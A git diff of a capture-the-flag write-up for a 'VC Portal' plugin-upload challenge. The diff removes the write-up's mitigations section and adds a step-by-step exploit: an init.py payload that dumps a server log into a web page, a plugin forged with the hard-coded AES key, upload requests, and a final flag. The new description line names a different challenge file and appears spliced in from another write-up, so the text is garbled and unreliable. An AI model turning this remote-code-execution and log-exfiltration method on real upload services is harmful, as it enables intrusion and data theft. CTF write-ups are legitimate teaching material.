@@ -9,20 +9,17 @@
 
 ## Description
 
-The VC Portal accepts plugin uploads as `.plugin` files. A `.plugin` is an AES-CBC encrypted ZIP (`iv || ciphertext`). On upload the server decrypts the file, extracts it, and **executes `init.py`** from the extracted directory. The application logs `init.py` stdout to `/opt/app/app.log`.
+This isn't wordpress...
 
-The supplied `flag.plugin` does **not** contain the flag directly; instead its `init.py` prints the flag from the environment variable `FLAG` and the server records that output in `app.log`.
-
-Goal: recover the flag.
-
+We get: `Hidden_in_the_Cartridge.7z`
 ---
 
 ## Vulnerabilities
 
-* **Arbitrary Code Execution:** Uploaded `init.py` is executed with `subprocess.run([...], cwd=plugin_dir)` with no sandboxing.
-* **Hard-coded symmetric key:** `KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"` allows anyone to craft valid `.plugin` packages.
-* **Log exposure vector:** Flag is printed to stdout by the official plugin and captured in `/opt/app/app.log`.
-* **Store gating by plugin count:** Downloading from `/store` is gated by `len(registry) > 2`, which can be trivially reached by uploading benign plugins.
+* Arbitrary Code Execution: Uploaded `init.py` is executed with `subprocess.run([...], cwd=plugin_dir)` with no sandboxing.
+* Hard-coded symmetric key: `KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"` allows anyone to craft valid `.plugin` packages.
+* Log exposure vector: Flag is printed to stdout by the official plugin and captured in `/opt/app/app.log`.
+* Store gating by plugin count: Downloading from `/store` is gated by `len(registry) > 2`, which can be trivially reached by uploading benign plugins.
 
 ---
 
@@ -36,95 +33,85 @@ Goal: recover the flag.
 
 ---
 
-## Tools & Helpers
+## Solve.py
 
-* `rce_log_grab.py` — builds & uploads the plugin, fetches the widget page, and searches for flags.
-  Path: `sandbox:/mnt/data/rce_log_grab.py`
-
-* `decrypt_store_plugin.py` — helper to decrypt an encrypted `.plugin` (iv||ct) and extract it locally.
-  Path: `sandbox:/mnt/data/decrypt_store_plugin.py`
-
-* `proof.png` — a small proof image used in this writeup.
-  Path: `sandbox:/mnt/data/proof.png`
-
-> **Requirements:** `pip install requests pycryptodome`
-
----
-
-## rce\_log\_grab.py (core exploit)
-
-```py
-# rce_log_grab.py - high level
-# - crafts a zip containing plugin_manifest.json, thumbnail.svg, index.html, init.py
-# - encrypts the zip with AES-CBC using the known key (iv||ciphertext)
-# - uploads to /upload
-# - finds the plugin UID on the dashboard
-# - fetches /widget/<uid> and searches for flag patterns
-```
-
-Key snippet for `init.py` used inside the plugin:
-
-```py
-# init.py (what we execute on the server)
-import html
+### 1. Payload that runs on the server:
+```python
+INIT_PY = r'''
+import os, html
 from pathlib import Path
-p = Path(__file__).resolve().parent
-data = Path('/opt/app/app.log').read_text(errors='ignore')
-(p / 'index.html').write_text('<!doctype html><meta charset="utf-8"><title>log</title><pre>' + html.escape(data) + '</pre>')
-print('ok')
+plug = Path(__file__).resolve().parent
+src = "/opt/app/app.log"
+try:
+    data = Path(src).read_text(errors="ignore")
+except Exception as e:
+    data = f"[read error] {e}"
+html_out = "<!doctype html><meta charset='utf-8'><title>log</title><pre>" + html.escape(data) + "</pre>"
+(plug / "index.html").write_text(html_out)
+print("ok")
+'''
+```
+This string becomes the init.py file inside the plugin ZIP.   
+When the server executes init.py, it:
+  Reads /opt/app/app.log (where the server logged the official plugin’s stdout that contains the flag).   
+  Builds a minimal HTML page wrapping the log (escaped so it’s safe to view).   
+  Writes that page to index.html inside the plugin directory.   
+  Prints "ok" to stdout (server captures stdout in logs too).   
+Result: after upload + execution, visiting /widget/<uid> will serve the index.html we just wrote (i.e., the server log).   
+
+
+### 2. Build plugin ZIP (in-memory)
+
+Create a ZIP containing the files the portal expects:
+- plugin_manifest.json   # {"name": NAME, "version":"1.0", "author":"me", "icon":"thumbnail.svg"}
+- thumbnail.svg          # small dashboard icon
+- index.html             # placeholder (payload will overwrite this on the server)
+- init.py                # the payload (INIT_PY) shown above
+
+### 3. Encrypt to .plugin format
+
+The server expects a .plugin file to be the IV (16 bytes) followed by AES-CBC(KEY, Padded(ZIP)). Steps:
+```python
+iv = os.urandom(16)                         # random 16-byte IV
+ciphertext = AES.new(KEY, AES.MODE_CBC, iv).encrypt(pad(zip_bytes, AES.block_size))
+plugin_blob = iv + ciphertext               # file contents to upload
+*Because the server uses a hard-coded key (KEY) we can produce a valid .plugin.
 ```
 
----
+### 4. Upload the plugin
 
-## Example run
+POST the .plugin to /upload as multipart form data:
+```python
+files = {'file': ('exploit.plugin', plugin_blob, 'application/octet-stream')}
+requests.post(f"{BASE}/upload", files=files)
+```
 
-1. Run the exploit script:
-
+On the server this triggers:
 ```bash
-python3 rce_log_grab.py
+Save uploaded file.
+Decrypt using KEY.
+Extract the zip into a new plugins/<uid>/ directory.
+Execute init.py with subprocess.run(..., cwd=plugin_dir) — our payload runs now.
 ```
 
-2. The script saves the widget page to `widget_log.html`. Search for the flag:
+### 5. Find your plugin UID on the dashboard
 
-```bash
-grep -Eo 'CTF\{[^}]+\}|UPT\{[^}]+\}' widget_log.html || grep -n 'MUHAHAHAHA:' widget_log.html
+After upload the dashboard (/) shows a widget card for the plugin. Scrape it to get the UID:
+```python
+<a class="link" href="/widget/<uid>">LOG_RIPPER</a>
+```
+The UID is used to fetch /widget/<uid> which serves that plugin’s index.html.
+
+### 6. Fetch the widget page (exfiltrate the log)
+
+GET /widget/<uid> — the server will now serve the index.html our payload wrote, which contains the escaped contents of /opt/app/app.log.
+
+Save it locally for inspection:
+```python
+page = requests.get(f"{BASE}/widget/{uid}").text
+open("widget_log.html","w").write(page)
 ```
 
-Typical log line to look for:
 
-```
-plugin_stdout uid=<...> out=You cannot see this MUHAHAHAHA: CTF{...}
-```
 
-Submit the token inside `CTF{...}`.
-
----
-
-## Why symlinks initially failed
-
-We attempted to create a symlink entry in the ZIP where `index.html` pointed at `/opt/app/app.log`, hoping Flask would follow it. On this server, `zipfile.extractall` produced a regular file containing the symlink text instead of a real symlink pointing to the log, so the symlink approach returned the literal path string rather than the log contents. The RCE `init.py` approach is reliable because the server *always* executes `init.py`.
-
----
-
-## Mitigations
-
-* **Do not execute** arbitrary uploaded code. If execution is required, run it in a hardened sandbox: unprivileged user, no network, syscall filtering (seccomp), CPU/memory/time caps, and read-only filesystem mounts except a controlled working directory.
-* **Use signatures, not symmetric encryption** in the upload flow. Sign plugin zips with Ed25519; verify on server before extracting. Never embed static keys in source code.
-* **Sanitize ZIP entries:** refuse absolute paths, `..` components, and symlink entries. Ensure extracted files remain within the intended plugin directory.
-* **Avoid logging secrets** to common logs or, at minimum, rotate and restrict log access.
-
----
-
-## Appendix — Files
-
-* `rce_log_grab.py` — exploit script.
-* `decrypt_store_plugin.py` — decrypt helper.
-* `proof.png` — small proof image used above.
-
----
-
-## Notes / Credit
-
-* Challenge: **VC Portal** — CTF\@AC
-* Author of this writeup: `stancium`
-* Techniques: AES format reversing, untrusted upload RCE, log exfiltration.
+### Flag:  CTF{9fb64c8a4d81f9d0e1f4108467bee58db112d0d1457fa3716cc6a46231803686}
